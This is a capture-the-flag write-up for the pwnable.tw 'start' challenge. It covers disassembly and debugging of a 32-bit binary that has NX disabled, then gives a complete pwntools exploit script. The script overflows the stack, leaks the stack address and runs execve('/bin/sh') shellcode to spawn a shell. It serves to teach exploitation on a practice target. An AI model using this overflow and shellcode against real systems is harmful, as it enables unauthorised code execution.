pwnable.tw start writeup
===

## environment

```sh
$ uname -a
Linux base-debootstrap 4.4.0-159-generic #187-Ubuntu SMP Thu Aug 1 16:28:06 UTC 2019 x86_64 x86_64 x86_64 GNU/Linux

$ gdb --version
GNU gdb (Ubuntu 7.11.1-0ubuntu1~16.5) 7.11.1
Copyright (C) 2016 Free Software Foundation, Inc.
License GPLv3+: GNU GPL version 3 or later <http://gnu.org/licenses/gpl.html>
This is free software: you are free to change and redistribute it.
There is NO WARRANTY, to the extent permitted by law.  Type "show copying"
and "show warranty" for details.
This GDB was configured as "x86_64-linux-gnu".
Type "show configuration" for configuration details.
For bug reporting instructions, please see:
<http://www.gnu.org/software/gdb/bugs/>.
Find the GDB manual and other documentation resources online at:
<http://www.gnu.org/software/gdb/documentation/>.
For help, type "help".
Type "apropos word" to search for commands related to "word".
```

## Finding

Executed file command.
This file is ELF file for 32bit.

```sh
$ file start
start: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), statically linked, not stripped
```

Extected strace command.
This file get 60 bytes input with read systemcall.

```sh
$ strace ./start 
execve("./start", ["./start"], [/* 19 vars */]) = 0
strace: [ Process PID=629 runs in 32 bit mode. ]
write(1, "Let's start the CTF:", 20Let's start the CTF:)    = 20
read(0, AAAA
"AAAA\n", 60)                   = 5
exit(0)                                 = ?
+++ exited with 0 +++
```

Disassemble with objdump.

```sh
$ objdump -M intel -d ./start 

./start:     file format elf32-i386


Disassembly of section .text:

08048060 <_start>:
 8048060:       54                      push   esp
 8048061:       68 9d 80 04 08          push   0x804809d
 8048066:       31 c0                   xor    eax,eax
 8048068:       31 db                   xor    ebx,ebx
 804806a:       31 c9                   xor    ecx,ecx
 804806c:       31 d2                   xor    edx,edx
 804806e:       68 43 54 46 3a          push   0x3a465443
 8048073:       68 74 68 65 20          push   0x20656874
 8048078:       68 61 72 74 20          push   0x20747261
 804807d:       68 73 20 73 74          push   0x74732073
 8048082:       68 4c 65 74 27          push   0x2774654c
 8048087:       89 e1                   mov    ecx,esp
 8048089:       b2 14                   mov    dl,0x14
 804808b:       b3 01                   mov    bl,0x1
 804808d:       b0 04                   mov    al,0x4
 804808f:       cd 80                   int    0x80
 8048091:       31 db                   xor    ebx,ebx
 8048093:       b2 3c                   mov    dl,0x3c
 8048095:       b0 03                   mov    al,0x3
 8048097:       cd 80                   int    0x80
 8048099:       83 c4 14                add    esp,0x14
 804809c:       c3                      ret    

0804809d <_exit>:
 804809d:       5c                      pop    esp
 804809e:       31 c0                   xor    eax,eax
 80480a0:       40                      inc    eax
 80480a1:       cd 80                   int    0x80
```

This file take the following behavior.

1. Initialize to 0 value on eax, ebx, ecx and edx.
2. Push 20 bytes value onto the stack(This value is "Let's start the CTF:")
3. Call write systemcall(al=0x4) and output character string of step 2
4. Call read systemcall(al=0x3) and receive 60 bytes input
5. Add 20 bytes of address in esp
6. Call ret instruction, and eip will be "0x804809d"(_exit function address)
7. Call _exit function

I can execute code with 0x14 bytes + "Address".
Try it with gdb.

```sh
$ python -c 'print("A"*0x14 + "BBBB")'
AAAAAAAAAAAAAAAAAAAABBBB
 gdb -q ./start
pwndbg: loaded 164 commands. Type pwndbg [filter] for a list.
pwndbg: created $rebase, $ida gdb functions (can be used with print/break)
Reading symbols from ./start...(no debugging symbols found)...done.
pwndbg> r
Starting program: /home/vagrant/work/tw/start/start 
Let's start the CTF:AAAAAAAAAAAAAAAAAAAABBBB

Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]────────────────────────────────────────────────────────────────────────────────
*EAX  0x19
 EBX  0x0
*ECX  0xffffd6e4 ◂— 0x41414141 ('AAAA')
*EDX  0x3c
 EDI  0x0
 ESI  0x0
 EBP  0x0
*ESP  0xffffd6fc —▸ 0xffffd70a ◂— 0xd84e0000
*EIP  0x42424242 ('BBBB')
─────────────────────────────────────────────────────────────────────────────────[ DISASM ]──────────────────────────────────────────────────────────────────────────────────
Invalid address 0x42424242










──────────────────────────────────────────────────────────────────────────────────[ STACK ]──────────────────────────────────────────────────────────────────────────────────
00:0000│ esp  0xffffd6fc —▸ 0xffffd70a ◂— 0xd84e0000
01:0004│      0xffffd700 ◂— 0x1
02:0008│      0xffffd704 —▸ 0xffffd82c ◂— 0x6d6f682f ('/hom')
03:000c│      0xffffd708 ◂— 0x0
04:0010│      0xffffd70c —▸ 0xffffd84e ◂— 0x4c454853 ('SHEL')
05:0014│      0xffffd710 —▸ 0xffffd85e ◂— 0x4d524554 ('TERM')
06:0018│      0xffffd714 —▸ 0xffffd872 ◂— 0x5f485353 ('SSH_')
07:001c│      0xffffd718 —▸ 0xffffd88f ◂— 0x5f485353 ('SSH_')
────────────────────────────────────────────────────────────────────────────────[ BACKTRACE ]────────────────────────────────────────────────────────────────────────────────
 ► f 0 42424242
Program received signal SIGSEGV (fault address 0x42424242)
```


:smile:


Next step, I checked security settings on this binary.

```sh
pwndbg> checksec
[*] '/home/vagrant/work/tw/start/start'
    Arch:     i386-32-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX disabled
    PIE:      No PIE (0x8048000)
```

wow... NX bit is desabled.
Okay, We can exec code on stack.

### Writeup

1. Launch ./start
2. Overflow and output esp address with "0x8048087"(mov ecx,esp)
3. Add 0x14 + shellcode
4. Execute shellcode

```python=
# coding: utf-8
from pwn import *

# Set target environment
context(os='linux', arch='i386')

HOST = 'chall.pwnable.tw'
PORT = 10000

# mov ecx, esp & write systemcall gadget address
stack_leak = 0x08048087
shell_code = asm('\n'.join([
    'push %d' % u32('/sh\0'),
    'push %d' % u32('/bin'),
    'xor edx, edx',
    'xor ecx, ecx',
    'mov ebx, esp',
    'mov eax, 0xb',
    'int 0x80',
]))

# for executing code on remote or local
if len(sys.argv) > 1 and sys.argv[1] == '-r':
    conn = remote(HOST, PORT)
else:
    conn = process('./start')

log.info('Pwning start')
conn.recvuntil(":")

# leak esp value
stage1 = b'A'*0x14
stage1 += p32(stack_leak)

# Save esp value and print esp value
conn.send(stage1)
stack_addr = u32(conn.recv(4))
log.info("Stack Address: {}".format(hex(stack_addr)))

# Add 0x14 and shellcode
stage2 = b'B'*0x14
stage2 += p32(stack_addr + 0x14)
stage2 += shell_code

# Get shell
conn.send(stage2)
conn.interactive()
```
